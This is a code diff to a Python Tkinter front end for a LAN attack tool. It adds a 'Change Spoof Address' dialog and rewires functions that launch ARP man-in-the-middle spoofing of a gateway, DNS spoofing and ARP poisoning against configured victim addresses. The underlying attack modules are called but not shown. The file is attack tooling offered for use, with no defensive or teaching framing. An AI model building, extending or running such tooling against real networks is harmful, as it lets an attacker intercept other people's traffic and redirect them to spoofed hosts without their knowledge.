@@ -10,7 +10,6 @@ import Tkinter as tk
 import time
 
 def main():
-
     os.system("clear")
     print("Hold on, Scanning Network...")
     interfaces = recon.list_interfaces()
@@ -236,7 +235,27 @@ def main():
         for entry in devicesListNAT: 
             tk.Label(popup, text=str(entry)).pack()
 
-        
+    def changeSpoof():
+        popup = tk.Toplevel(win)
+        popup.geometry("200x200")
+        popup.title("Devices")
+        popup.resizable(False, False) 
+
+
+        addr = tk.StringVar()
+
+        def changeIP():
+            global address
+            address = addr.get()
+            print(address)
+            popup.destroy()
+
+        tk.Label(popup, text="Enter new address to spoof").pack()
+        entryIP = tk.Entry(popup, textvariable=addr)
+        entryIP.pack()
+
+        button = tk.Button(popup, text="Change", command=changeIP)
+        button.pack(pady=10)
 
 
 
@@ -247,21 +266,25 @@ def main():
     changeMenu.add_command(label="Change Target Details (NAT)", command=changeTargetNAT)
     changeMenu.add_command(label="Change Gateway Details (NAT)", command=changeGateNAT)
     changeMenu.add_command(label="Change Attacker Details (NAT)", command=changeAttNAT)
+    changeMenu.add_command(label="Change Spoof Address", command=changeSpoof)
     changeMenu.add_command(label="View Device List", command=showList)
     menu.add_cascade(label="Change Details", menu=changeMenu)
-
-
         
 
     def dns():
         print("MITM Activated")
-        gatewayspoof = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
-        print("DNS Spoofing")
-        dnsthread = threading.Thread(target=dns_spoof.dns_spoof)
-        gatewayspoof.start()
-        dnsthread.start()
-        gatewayspoof.join()
-        dnsthread.join()
+        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
+        try:
+            print("DNS Spoofing")
+            dns_spoof.dns_spoof(address)
+        except NameError: 
+            popup = tk.Toplevel(win)
+            popup.geometry("250x100")
+            popup.title("Error")
+            popup.resizable(False, False) 
+
+            tk.Label(popup, text="Please enter an address to spoof.").pack(pady=40)
+
 
     def arpPoison():
         arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
